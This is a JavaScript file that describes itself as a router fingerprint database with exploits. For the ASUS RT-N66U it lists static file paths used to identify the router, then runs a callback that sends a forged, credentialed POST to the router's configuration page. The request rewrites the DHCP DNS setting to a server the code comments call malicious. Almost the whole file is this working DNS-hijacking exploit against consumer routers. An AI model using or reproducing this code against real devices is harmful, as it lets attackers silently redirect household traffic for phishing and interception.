/*
 * This is a fingerprint database with exploits to change the DNS server set by the router
*/
var dns_server_ip = '8.8.8.8'; // IP address of malicious DNS server to poison routers with
var fingerprints = [
    {
        'name': "ASUS RT-N66U",
        'fingerprints': ["/images/New_ui/asustitle.png","/images/loading.gif","/images/alertImg.png","/images/New_ui/networkmap/line_one.png","/images/New_ui/networkmap/lock.png","/images/New_ui/networkmap/line_two.png","/index_style.css","/form_style.css","/NM_style.css","/other.css"],
        'callback': function( ip ) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "http://" + ip + "/start_apply.htm", true);
            xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.withCredentials = true;
            var body = "productid=RT-N66U&current_page=Advanced_DHCP_Content.asp&next_page=Advanced_GWStaticRoute_Content.asp&next_host=" + ip + "&modified=0&action_mode=apply&action_wait=30&action_script=restart_net_and_phy&first_time=&preferred_lang=EN&firmver=3.0.0.4&lan_ipaddr=" + ip + "&lan_netmask=255.255.255.0&dhcp_staticlist=&dhcp_enable_x=1&lan_domain=&dhcp_start=192.168.1.2&dhcp_end=192.168.1.254&dhcp_lease=86400&dhcp_gateway_x=&dhcp_dns1_x=" + dns_server_ip + "&dhcp_wins_x=&dhcp_static_x=0&dhcp_staticmac_x_0=&dhcp_staticip_x_0=&FAQ_input=";
            var aBody = new Uint8Array(body.length);
            for (var i = 0; i < aBody.length; i++)
              aBody[i] = body.charCodeAt(i); 
            xhr.send(new Blob([aBody]));
        },
    },
]
